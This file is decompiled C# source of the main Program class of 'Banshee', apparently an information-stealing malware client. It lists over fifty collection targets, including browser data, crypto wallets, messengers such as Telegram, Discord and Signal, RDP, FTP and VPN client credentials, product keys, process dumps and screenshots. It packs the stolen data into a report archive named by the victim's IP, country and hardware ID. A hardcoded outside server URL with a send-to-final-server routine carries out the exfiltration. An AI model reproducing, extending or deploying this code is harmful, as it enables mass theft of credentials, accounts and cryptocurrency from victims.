﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Banshee.Helper.Data;
using Banshee.Targets;
using Banshee.Targets.Applications;
using Banshee.Targets.Browsers;
using Banshee.Targets.Crypto;
using Banshee.Targets.Device;
using Banshee.Targets.Games;
using Banshee.Targets.Messangers;
using Banshee.Targets.Vpn;

namespace Banshee.Client
{
	// Token: 0x02000105 RID: 261
	public class Program
	{
		// Token: 0x0600037D RID: 893 RVA: 0x0001C82C File Offset: 0x0001C82C
		public static Task Main(string[] args)
		{
			Program.<Main>d__5 <Main>d__;
			<Main>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<Main>d__.args = args;
			<Main>d__.<>1__state = -1;
			<Main>d__.<>t__builder.Start<Program.<Main>d__5>(ref <Main>d__);
			return <Main>d__.<>t__builder.Task;
		}

		// Token: 0x0600037E RID: 894 RVA: 0x0001C870 File Offset: 0x0001C870
		public static Task<string> CollectAndZipDataAsync(string outputDirectory = null)
		{
			Program.<CollectAndZipDataAsync>d__6 <CollectAndZipDataAsync>d__;
			<CollectAndZipDataAsync>d__.<>t__builder = AsyncTaskMethodBuilder<string>.Create();
			<CollectAndZipDataAsync>d__.outputDirectory = outputDirectory;
			<CollectAndZipDataAsync>d__.<>1__state = -1;
			<CollectAndZipDataAsync>d__.<>t__builder.Start<Program.<CollectAndZipDataAsync>d__6>(ref <CollectAndZipDataAsync>d__);
			return <CollectAndZipDataAsync>d__.<>t__builder.Task;
		}

		// Token: 0x0600037F RID: 895 RVA: 0x0001C8B4 File Offset: 0x0001C8B4
		private static void CollectWithTimeout(ITarget target, InMemoryZip zip, Counter counter, CancellationToken token, bool isBrowser)
		{
			string text = isBrowser ? "BROWSER" : "TARGET";
			string name = target.GetType().Name;
			using (CancellationTokenSource cancellationTokenSource = CancellationTokenSource.CreateLinkedTokenSource(new CancellationToken[]
			{
				token
			}))
			{
				Task task = Task.Run(delegate()
				{
					target.Collect(zip, counter);
				}, cancellationTokenSource.Token);
				if (Task.WhenAny(new Task[]
				{
					task,
					Task.Delay(TimeSpan.FromSeconds(45.0), token)
				}).ConfigureAwait(false).GetAwaiter().GetResult() != task)
				{
					cancellationTokenSource.Cancel();
					Task.WhenAny(new Task[]
					{
						task,
						Task.Delay(TimeSpan.FromSeconds(5.0), token)
					}).ConfigureAwait(false).GetAwaiter().GetResult();
					object stringBuilderErrorLock = Program.StringBuilderErrorLock;
					lock (stringBuilderErrorLock)
					{
						Program.stringBuilderError.AppendLine(string.Concat(new string[]
						{
							"[",
							text,
							": ",
							name,
							"] Collection timed out"
						}));
						return;
					}
				}
				try
				{
					task.GetAwaiter().GetResult();
				}
				catch (OperationCanceledException)
				{
					object stringBuilderErrorLock = Program.StringBuilderErrorLock;
					lock (stringBuilderErrorLock)
					{
						Program.stringBuilderError.AppendLine(string.Concat(new string[]
						{
							"[",
							text,
							": ",
							name,
							"] Collection cancelled (timeout)"
						}));
					}
				}
				catch (Exception ex)
				{
					object stringBuilderErrorLock = Program.StringBuilderErrorLock;
					lock (stringBuilderErrorLock)
					{
						Program.stringBuilderError.AppendLine(string.Concat(new string[]
						{
							"[",
							text,
							": ",
							name,
							"] ",
							ex.Message
						}));
					}
				}
			}
		}

		// Token: 0x06000380 RID: 896 RVA: 0x0001CB84 File Offset: 0x0001CB84
		public static Task<string> CollectAndZipDataWithoutProcessKillAsync()
		{
			Program.<CollectAndZipDataWithoutProcessKillAsync>d__8 <CollectAndZipDataWithoutProcessKillAsync>d__;
			<CollectAndZipDataWithoutProcessKillAsync>d__.<>t__builder = AsyncTaskMethodBuilder<string>.Create();
			<CollectAndZipDataWithoutProcessKillAsync>d__.<>1__state = -1;
			<CollectAndZipDataWithoutProcessKillAsync>d__.<>t__builder.Start<Program.<CollectAndZipDataWithoutProcessKillAsync>d__8>(ref <CollectAndZipDataWithoutProcessKillAsync>d__);
			return <CollectAndZipDataWithoutProcessKillAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000381 RID: 897 RVA: 0x0001CBC0 File Offset: 0x0001CBC0
		public static Task CollectAndSendDataToFinalServer(string userIdentifier)
		{
			Program.<CollectAndSendDataToFinalServer>d__9 <CollectAndSendDataToFinalServer>d__;
			<CollectAndSendDataToFinalServer>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<CollectAndSendDataToFinalServer>d__.userIdentifier = userIdentifier;
			<CollectAndSendDataToFinalServer>d__.<>1__state = -1;
			<CollectAndSendDataToFinalServer>d__.<>t__builder.Start<Program.<CollectAndSendDataToFinalServer>d__9>(ref <CollectAndSendDataToFinalServer>d__);
			return <CollectAndSendDataToFinalServer>d__.<>t__builder.Task;
		}

		// Token: 0x06000382 RID: 898 RVA: 0x0001CC04 File Offset: 0x0001CC04
		private static string BuildArchiveLabel(string countryName, string publicIp, string hwid)
		{
			string text = Program.SanitizeFileComponent(string.IsNullOrWhiteSpace(countryName) ? "UnknownCountry" : countryName.Replace(' ', '_'), "UnknownCountry");
			string text2 = Program.SanitizeFileComponent(string.IsNullOrWhiteSpace(hwid) ? "UnknownHWID" : hwid, "UnknownHWID");
			string text3 = Program.SanitizeFileComponent(Program.EnsureIpv4Label(string.IsNullOrWhiteSpace(publicIp) ? text2 : publicIp), "0.0.0.0");
			return string.Concat(new string[]
			{
				"[",
				text,
				"]",
				text3,
				"-Banshee-Report(",
				text2,
				")"
			});
		}

		// Token: 0x06000383 RID: 899 RVA: 0x0001CCA4 File Offset: 0x0001CCA4
		private static string SanitizeFileComponent(string value, string fallback)
		{
			if (string.IsNullOrWhiteSpace(value))
			{
				return fallback;
			}
			char[] invalidFileNameChars = Path.GetInvalidFileNameChars();
			StringBuilder stringBuilder = new StringBuilder(value.Length);
			foreach (char c in value)
			{
				if (!invalidFileNameChars.Contains(c))
				{
					if (char.IsWhiteSpace(c))
					{
						stringBuilder.Append('_');
					}
					else
					{
						stringBuilder.Append(c);
					}
				}
			}
			if (stringBuilder.Length != 0)
			{
				return stringBuilder.ToString();
			}
			return fallback;
		}

		// Token: 0x06000384 RID: 900 RVA: 0x0001CD20 File Offset: 0x0001CD20
		private static string EnsureIpv4Label(string value)
		{
			string result;
			if (Program.TryNormalizeIpv4(value, out result))
			{
				return result;
			}
			return "0.0.0.0";
		}

		// Token: 0x06000385 RID: 901 RVA: 0x0001CD40 File Offset: 0x0001CD40
		private static bool TryNormalizeIpv4(string value, out string ipv4)
		{
			ipv4 = null;
			if (string.IsNullOrWhiteSpace(value))
			{
				return false;
			}
			string text = value.Trim();
			if (Program.TryParseIpv4(text, out ipv4))
			{
				return true;
			}
			using (IEnumerator enumerator = Regex.Matches(text, "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b").GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (Program.TryParseIpv4(((Match)enumerator.Current).Value, out ipv4))
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x06000386 RID: 902 RVA: 0x0001CDCC File Offset: 0x0001CDCC
		private static bool TryParseIpv4(string value, out string ipv4)
		{
			ipv4 = null;
			IPAddress ipaddress;
			if (IPAddress.TryParse(value, out ipaddress) && ipaddress.AddressFamily == AddressFamily.InterNetwork)
			{
				ipv4 = ipaddress.ToString();
				return true;
			}
			return false;
		}

		// Token: 0x06000389 RID: 905 RVA: 0x0001D0A4 File Offset: 0x0001D0A4
		private static void <Main>(string[] args)
		{
			Program.Main(args).GetAwaiter().GetResult();
		}

		// Token: 0x040002C0 RID: 704
		private const string FinalServerBaseUrl = "https://196.251.107.99:8443/Jab5v4UuABP5ntWm8jVts1Jpi4xah/";

		// Token: 0x040002C1 RID: 705
		public static List<ITarget> targetsBrowsers = new List<ITarget>
		{
			new Chromium(),
			new Gecko()
		};

		// Token: 0x040002C2 RID: 706
		public static List<ITarget> targets = new List<ITarget>
		{
			new ScreenShot(),
			new GameList(),
			new InstalledBrowsers(),
			new InstalledPrograms(),
			new ProcessDump(),
			new ProductKey(),
			new SystemInfo(),
			new Telegram(),
			new Discord(),
			new MicroSIP(),
			new Jabber(),
			new Pidgin(),
			new Signal(),
			new Tox(),
			new Steam(),
			new Rdp(),
			new AnyDesk(),
			new CyberDuck(),
			new DynDns(),
			new FileZilla(),
			new Ngrok(),
			new TeamViewer(),
			new WinSCP(),
			new TotalCommander(),
			new FTPNavigator(),
			new FTPRush(),
			new CoreFtp(),
			new FTPGetter(),
			new FTPCommander(),
			new NoIp(),
			new RDCMan(),
			new Xmanager(),
			new JetBrains(),
			new PuTTY(),
			new Cisco(),
			new RadminVPN(),
			new CyberGhost(),
			new ExpressVPN(),
			new HideMyName(),
			new IpVanish(),
			new MullVad(),
			new NordVpn(),
			new OpenVpn(),
			new PIAVPN(),
			new ProtonVpn(),
			new Proxifier(),
			new SurfShark(),
			new Hamachi(),
			new WireGuard(),
			new SoftEther(),
			new CryptoDesktop(),
			new Grabber(),
			new UserAgentGenerator(),
			new CryptoChromium(),
			new CryptoGecko()
		};

		// Token: 0x040002C3 RID: 707
		public static StringBuilder stringBuilderError = new StringBuilder();

		// Token: 0x040002C4 RID: 708
		private static readonly object StringBuilderErrorLock = new object();
	}
}
